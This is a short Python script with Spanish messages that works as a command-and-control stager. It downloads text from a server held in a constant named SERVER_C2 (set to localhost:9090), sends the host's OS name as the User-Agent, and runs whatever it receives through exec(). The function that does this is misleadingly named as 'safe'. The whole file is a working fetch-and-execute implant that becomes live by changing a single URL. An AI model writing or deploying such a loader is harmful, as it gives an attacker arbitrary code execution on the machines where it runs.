import requests
import platform

SERVER_C2 = "http://localhost:9090"

def download_remote_file(url):
    try:
        headers = {
            'User-Agent': f"{platform.system()}"
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return response.text
        else:
            print(f"Error al descargar el archivo. Código de estado: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error de conexión: {e}")
        return None
    except Exception as e:
        print(f"Error al descargar el archivo: {e}")
        return None

def execute_remote_python_code_safely(code):
    try:
        exec(code, {})
    except Exception as e:
        print(f"Error al ejecutar el código remoto: {e}")

if __name__ == "__main__":
    remote_code = download_remote_file(SERVER_C2)
    if remote_code is not None:
        print("Ejecutando código remoto...")
        execute_remote_python_code_safely(remote_code)